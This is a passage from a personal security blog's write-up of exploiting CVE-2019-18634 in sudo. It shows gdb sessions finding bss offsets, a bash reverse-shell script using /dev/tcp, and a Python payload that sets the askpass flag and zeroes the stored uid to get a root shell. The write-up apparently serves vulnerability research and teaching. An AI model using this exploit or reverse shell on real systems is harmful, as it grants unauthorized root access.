<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;/usr/bin/sudo&#39;</span> stopped with exit code -11 <span style="color:#f92672">(</span>SIGSEGV<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>pid 4487<span style="color:#f92672">)</span>
</code></pre></div><p>Now that we have reproduced the POC with the right control character <strong>('\x15&rsquo;)</strong> and also can debug it correctly, let&rsquo;s move on to exploitation.</p>
<h1 id="exploitation">Exploitation</h1>
<h3 id="runing-checksec-on-the-binary">Runing checksec on the binary</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  checksec
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> checksec <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;/usr/bin/sudo&#39;</span>
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✓ 
RelRO                         : Full
</code></pre></div><p>Looking at this might scare you away from trying to exploit sudo, but let&rsquo;s focus on the primitives we have.
We have a bss overflow and no RIP control, so let&rsquo;s get creative.</p>
<p>Initially before the exploitation, while looking at the help of sudo, I noticed the askpass option</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -h 
sudo - execute a command as another user
  -A, --askpass                 use a helper program <span style="color:#66d9ef">for</span> password prompting
</code></pre></div><p><strong>man sudo</strong> describes askpass as</p>
<pre><code>Normally, if sudo requires a password, it will read it from
the user's terminal.  If the -A (askpass) option is speci‐
fied, a (possibly graphical) helper program is executed to
read the user's password and output the password to the stan‐
dard output.  If the SUDO_ASKPASS environment variable is
set, it specifies the path to the helper program.  Otherwise,
if sudo.conf(5) contains a line specifying the askpass pro‐
gram, that value will be used.  For example:

    # Path to askpass helper program
    Path askpass /usr/X11R6/bin/ssh-askpass

If no askpass program is available, sudo will exit with an
error.
</code></pre><p>Okay, so sudo can execute a user defined program, but at what privileges? Let&rsquo;s look for the code reference for this askpass</p>
<p>grep reveals <strong>sudo_askpass</strong> as: (I have not included the unnecessary code from the top and bottom)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
</span><span style="color:#75715e"> * Fork a child and exec sudo-askpass to get the password from the user.
</span><span style="color:#75715e"> */</span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>
<span style="color:#a6e22e">sudo_askpass</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>askpass, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>prompt)
{
    child <span style="color:#f92672">=</span> sudo_debug_fork();
    <span style="color:#66d9ef">if</span> (child <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
	sudo_fatal(U_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">unable to fork</span><span style="color:#e6db74">&#34;</span>));

    <span style="color:#66d9ef">if</span> (child <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
	<span style="color:#75715e">/* child, point stdout to output side of the pipe and exec askpass */</span>
	<span style="color:#66d9ef">if</span> (dup2(pfd[<span style="color:#ae81ff">1</span>], STDOUT_FILENO) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
	    sudo_warn(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">dup2</span><span style="color:#e6db74">&#34;</span>);
	    _exit(<span style="color:#ae81ff">255</span>);
	}
	<span style="color:#66d9ef">if</span> (setuid(ROOT_UID) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
	    sudo_warn(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">setuid(%d)</span><span style="color:#e6db74">&#34;</span>, ROOT_UID);
	<span style="color:#66d9ef">if</span> (setgid(user_details.gid)) {
	    sudo_warn(U_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">unable to set gid to %u</span><span style="color:#e6db74">&#34;</span>), (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)user_details.gid);
	    _exit(<span style="color:#ae81ff">255</span>);
	}
	<span style="color:#66d9ef">if</span> (setuid(user_details.uid)) {
	    sudo_warn(U_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">unable to set uid to %u</span><span style="color:#e6db74">&#34;</span>), (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)user_details.uid);
	    _exit(<span style="color:#ae81ff">255</span>);
	}
	closefrom(STDERR_FILENO <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
	execl(askpass, askpass, prompt, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)NULL);
	sudo_warn(U_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">unable to run %s</span><span style="color:#e6db74">&#34;</span>), askpass);
	_exit(<span style="color:#ae81ff">255</span>);
    }
</code></pre></div><p>Note the line <strong>setuid(user_details.uid)</strong>, our program will be executed with our privileges, but if we manage to set the user_details.uid to 0, our program might run as root. So where does this user_details structure lies? Let&rsquo;s look at gdb. We set a breakpoint at tgetpass.c:333, and start our python program. Attaching to the debugger and continuing the python program immediately hits the breakpoint.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">gef➤  i b
Num     Type           Disp Enb Address            What
<span style="color:#ae81ff">1</span>       breakpoint     keep y   0x0000560340c6b981 in getln at ./tgetpass.c:333
	breakpoint already hit <span style="color:#ae81ff">1</span> time
gef➤  p buf
$2 <span style="color:#f92672">=</span> 0x560340e762c0 &lt;buf&gt; <span style="color:#e6db74">&#34;&#34;</span>

gef➤  p &amp;user_details
$3 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>struct user_details *<span style="color:#f92672">)</span> 0x560340e76500 &lt;user_details&gt;

gef➤  p user_details
$4 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
  pid <span style="color:#f92672">=</span> 0x7d6c, 
  ppid <span style="color:#f92672">=</span> 0x7d69, 
  pgid <span style="color:#f92672">=</span> 0x7d6c, 
  tcpgid <span style="color:#f92672">=</span> 0x7d6c, 
  sid <span style="color:#f92672">=</span> 0x7d6c, 
  uid <span style="color:#f92672">=</span> 0x3e8, 
  euid <span style="color:#f92672">=</span> 0x0, 
  gid <span style="color:#f92672">=</span> 0x3e8, 
  egid <span style="color:#f92672">=</span> 0x3e8, 
  username <span style="color:#f92672">=</span> 0x560342e1ecd5 <span style="color:#e6db74">&#34;sudouser&#34;</span>, 
  cwd <span style="color:#f92672">=</span> 0x560342e1ef14 <span style="color:#e6db74">&#34;/mnt&#34;</span>, 
  tty <span style="color:#f92672">=</span> 0x560342e1ef34 <span style="color:#e6db74">&#34;/dev/pts/4&#34;</span>, 
  host <span style="color:#f92672">=</span> 0x560342e1efa5 <span style="color:#e6db74">&#34;sudotester&#34;</span>, 
  shell <span style="color:#f92672">=</span> 0x560342e1ecf0 <span style="color:#e6db74">&#34;/bin/bash&#34;</span>, 
  groups <span style="color:#f92672">=</span> 0x560342e1eea0, 
  ngroups <span style="color:#f92672">=</span> 0x2, 
  ts_cols <span style="color:#f92672">=</span> 0x50, 
  ts_lines <span style="color:#f92672">=</span> 0x18
<span style="color:#f92672">}</span>

gef➤  p/d 0x560340e76500-0x560340e762c0
$5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">576</span>
</code></pre></div><p>Our <strong>user_details struct lies 576 bytes ahead of the buffer position</strong>, very well, we can very easily change its uid to 0, but how do we make the program follow this path? We cannnot just start sudo with <strong>-A</strong> flag as the overflow lies in the input prompt. We need to find the code which dictates the path of the program.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  src grep -nr <span style="color:#e6db74">&#34;sudo_askpass&#34;</span>
tgetpass.c:52:static char *sudo_askpass<span style="color:#f92672">(</span>const char *, const char *<span style="color:#f92672">)</span>;
tgetpass.c:117:	debug_return_str_masked<span style="color:#f92672">(</span>sudo_askpass<span style="color:#f92672">(</span>askpass, prompt<span style="color:#f92672">)</span><span style="color:#f92672">)</span>;
tgetpass.c:238:sudo_askpass<span style="color:#f92672">(</span>const char *askpass, const char *prompt<span style="color:#f92672">)</span>
tgetpass.c:244:    debug_decl<span style="color:#f92672">(</span>sudo_askpass, SUDO_DEBUG_CONV<span style="color:#f92672">)</span>
</code></pre></div><p><strong>sudo_askpass</strong> is being called in tgetpass.c line 117</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> (ISSET(flags, TGP_ASKPASS)) {
	<span style="color:#66d9ef">if</span> (askpass <span style="color:#f92672">=</span><span style="color:#f92672">=</span> NULL <span style="color:#f92672">|</span><span style="color:#f92672">|</span> <span style="color:#f92672">*</span>askpass <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">\0</span><span style="color:#e6db74">&#39;</span>)
	    sudo_fatalx(U_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">no askpass program specified, try setting SUDO_ASKPASS</span><span style="color:#e6db74">&#34;</span>));
	debug_return_str_masked(sudo_askpass(askpass, prompt));
</code></pre></div><p>If <strong>TGP_ASKPASS</strong> is set the program takes the execution path and <strong>flags</strong> is passed as a parameter to <strong>tgetpass</strong>. Looking at the backtrace, <strong>tgetpass</strong> was called by <strong>sudo_conversation</strong> in <strong>conversation.c line 72</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#66d9ef">int</span> flags <span style="color:#f92672">=</span> tgetpass_flags;
    .
    .
    .
	<span style="color:#75715e">/* Read the password unless interrupted. */</span>
	pass <span style="color:#f92672">=</span> tgetpass(msg<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>msg, msg<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>timeout, flags, callback);
	<span style="color:#66d9ef">if</span> (pass <span style="color:#f92672">=</span><span style="color:#f92672">=</span> NULL)
</code></pre></div><p>We can now use gdb to switch frames and find the location of tgetpass_flags</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">gef➤  frame <span style="color:#ae81ff">2</span>
<span style="color:#75715e">#2  0x0000560340c5a933 in sudo_conversation (num_msgs=&lt;optimized out&gt;, msgs=&lt;optimized out&gt;, replies=0x7ffcb4f7fea8, callback=0x7ffcb4f802f0) at ./conversation.c:72</span>
72			pass <span style="color:#f92672">=</span> tgetpass<span style="color:#f92672">(</span>msg-&gt;msg, msg-&gt;timeout, flags, callback<span style="color:#f92672">)</span>;
gef➤  p tgetpass_flags
$6 <span style="color:#f92672">=</span> 0x2
gef➤  p &amp;tgetpass_flags
$7 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>int *<span style="color:#f92672">)</span> 0x560340e764e4 &lt;tgetpass_flags&gt;
gef➤  frame <span style="color:#ae81ff">0</span>
<span style="color:#75715e">#0  getln (fd=0x0, buf=0x560340e762c0 &lt;buf&gt; &#34;&#34;, feedback=0x8, bufsiz=0x100) at ./tgetpass.c:334</span>
334		    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>c <span style="color:#f92672">=</span><span style="color:#f92672">=</span> sudo_term_erase<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
gef➤  p buf
$8 <span style="color:#f92672">=</span> 0x560340e762c0 &lt;buf&gt; <span style="color:#e6db74">&#34;&#34;</span>
gef➤  p/d 0x560340e764e4-0x560340e762c0
$9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">548</span>
</code></pre></div><p><strong>tgetpass_flags lies 548 bytes ahead of the buffer</strong>, so we can overwrite the flags too.<br>
We now have our exploit path ready</p>
<ol>
<li>Move the pointer ahead by 548 bytes, by abusing the buffer overflow</li>
<li>SET TGP_ASKPASS flag</li>
<li>Again move the pointer ahead till we reach user_details struct</li>
<li>Set UID to 0</li>
</ol>
<p>At this stage, we just can start the program with SUDO_ASKPASS environment variable set to the program we want to execute and it should all play out perfectly.</p>
<blockquote>
<p>When I was filling the buffer, I used the character A to fill the buffer and my program kept crashing because of SIGILL. I was very sure there cannot be a SIGILL because of the type of vulnerability, looking around the code, I spotted, a <strong>signo</strong> buffer which handled all the signals sudo received and it resent it back to itself. This is why I kept getting a SIGILL. After switching from character A to null byte my root shell popped.</p>
</blockquote>
<p>Let&rsquo;s finish writing the code for the python exploit</p>
<p>We first create the program to be run by askpass, I will be using a reverse shell which connects to out listener on port 4444</p>
<h4 id="rssh">rs.sh</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
</code></pre></div><p>We then start a server at port 4444<br>
We fill the buffer with 548 0s and then set the flags<br>
We then fill it with 20 more 0s to reach the user_details struct<br>
We then fill the userdetails struct with the right details, but set uid with three null chars as the <strong>\n</strong> is replaced by <strong>\0</strong> by the getln function, making the uid <strong>0</strong></p>
<h4 id="exploitpy">exploit.py</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">r<span style="color:#f92672">=</span>listen(<span style="color:#ae81ff">4444</span>)    

mfd, sfd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>openpty()
fd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>open(os<span style="color:#f92672">.</span>ttyname(sfd), os<span style="color:#f92672">.</span>O_RDONLY)

p <span style="color:#f92672">=</span> process([TARGET,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-S</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">id</span><span style="color:#e6db74">&#34;</span>],env<span style="color:#f92672">=</span>{<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">SUDO_ASKPASS</span><span style="color:#e6db74">&#39;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/tmp/rs.sh</span><span style="color:#e6db74">&#34;</span>}, stdin<span style="color:#f92672">=</span>fd)
pid <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>pid
ppid <span style="color:#f92672">=</span> util<span style="color:#f92672">.</span>proc<span style="color:#f92672">.</span>parent(pid)

payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x15</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">548</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(setFlags(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">TGP_STDIN|TGP_ASKPASS</span><span style="color:#e6db74">&#34;</span>))
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x15</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">20</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(pid)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(ppid)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(pid)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(pid)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(pid)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>

os<span style="color:#f92672">.</span>write(mfd, payload)
r<span style="color:#f92672">.</span>wait_for_connection()
r<span style="color:#f92672">.</span>interactive()
    
sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
</code></pre></div><h3 id="result">Result</h3>
<p><a href="https://asciinema.org/a/299148"><img src="https://asciinema.org/a/299148.svg" alt="asciicast"></a></p>
<h1 id="conclusion">Conclusion</h1>
<p>The exploit can work very easily for versions <strong>&gt;=1.8.26</strong> as the eof handler in newer version will only handle the 0x4 or EOF character, not using that character anywhere will lead to a flawless execution of the exploit.</p>
<p>This was a very good learning opportunity for me and I would like to thank <a href="https://twitter.com/wcbowling">@vakzz</a> for helping me deal with the write fails, I initially couldn&rsquo;t understand how to make the write fail and that was super frustrating but nonetheless a learning experience.</p>
<p>In my opinion, this is a very good vulnerability to start with real world binaries as the complete source code is available and doesn&rsquo;t require weird pointer manipulations and other stack setup to get a shell, the win function is already present and all you need to do is guide the program to towards it and overflow some bits. It also teaches a lot about terminals, pty, the special characters and ends up being super fun to exploit.</p>
<p>You can find the complete code on my <a href="https://github.com/iamalsaher/CVE-POCs/blob/master/CVE-2019-18634.py">github</a><br>
Right now it only works for version 1.8.25 but only the offsets need to be changed to put it to use for other versions.</p>
<p>Feel free to ping me on <a href="https://twitter.com/iamalsaher">twitter</a> or disqus here for any questions.</p>

    </div>
    
      
    


    
      
        <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "iamalsaher" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

      
    

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">iamalsaher</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
      </div>
    
  </div>
</footer>

<script src="https://iamalsaher.tech/assets/main.js"></script>
<script src="https://iamalsaher.tech/assets/prism.js"></script>


      
    </div>

    
      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-139942455-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    
  </body>
</html>
